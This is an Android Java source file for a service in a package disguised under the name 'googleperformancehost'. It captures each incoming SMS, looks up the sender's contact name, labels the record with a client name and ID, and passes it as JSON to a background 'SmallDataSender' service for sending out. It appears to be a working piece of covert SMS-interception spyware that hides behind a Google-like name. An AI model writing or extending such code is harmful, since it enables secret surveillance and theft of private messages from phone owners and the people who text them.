package com.example.tiber.googleperformancehost.Services.Temporary;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Daemons.SmallDataSender;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.ReceivedSmsData;
import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;
import com.google.gson.Gson;


public class ReceivedSMSHandlerIntentService extends IntentService{

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public ReceivedSMSHandlerIntentService(String name) {
        super("sms_handler_intent_service");
    }

    public ReceivedSMSHandlerIntentService(){
        super("sms_handler_intent_service");
    }
    @Override
    protected void onHandleIntent(Intent intent) {
        Log.wtf("ReceivedSMSHandlerIntentService ::", "onHandleIntent()");

        String senderNumber = intent.getStringExtra("senderNumber");
        String message = intent.getStringExtra("message");
        int time = intent.getIntExtra("time",DateUtil.nowIntFormat());

        String contactName = getContactName(senderNumber);
        ReceivedSmsData sms = new ReceivedSmsData(time,
                getApplicationContext().getResources().getString(R.string.CLIENT_NAME),
                getApplicationContext().getResources().getInteger(R.integer.CLIENT_ID));

        sms.setMessage(message);
        sms.setName(contactName);
        sms.setNumber(senderNumber);

        Intent startSmallDataSender = new Intent(getApplicationContext(), SmallDataSender.class);
        startSmallDataSender.putExtra("smsJson",new Gson().toJson(sms,ReceivedSmsData.class));
        startSmallDataSender.putExtra("what","receivedSMS");
        getApplicationContext().startService(startSmallDataSender);
    }

    public String getContactName( String phoneNumber ) {
        if(phoneNumber == null )
            return null;
        ContentResolver cr = getApplicationContext().getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if(cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }

        if(cursor != null && !cursor.isClosed()) {
            cursor.close();
        }

        return contactName;
    }
}
